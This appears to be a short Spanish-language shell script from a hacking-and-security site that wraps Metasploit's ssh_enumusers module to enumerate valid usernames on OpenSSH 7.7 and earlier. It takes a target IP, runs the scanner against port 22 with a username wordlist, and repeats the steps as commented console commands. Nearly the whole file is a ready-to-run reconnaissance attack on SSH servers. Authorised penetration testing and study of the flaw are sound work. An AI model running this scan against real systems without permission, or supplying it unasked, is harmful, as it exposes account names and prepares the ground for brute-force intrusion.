#!/bin/sh
# Ver usuarios existentes en OpenSSH 7.7 y versiones anteriores
# Antonio Taboada - hackingyseguridad.com 2026
# OpenSSH < 7.7 - User Enumeration
# Descargar diccionario de usuarios

echo
echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
echo ".."
echo "..."
echo "Uso.: sh enumuser.sh IP"
echo "al finalizar, para salir teclear exit"
# Ejecutamos metaxploit
# para salir teclea exit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $1; set RPORT 22; set USER_FILE /home/antonio/ssha/usuarios0.txt; run"
#
# modo consola
#
# msfconsole -q
# use auxiliary/scanner/ssh/ssh_enumusers
# set RHOSTS 192.168.1.100
# set RPORT 2222
# set USER_FILE /usr/share/wordlists/common_users.txt
# run
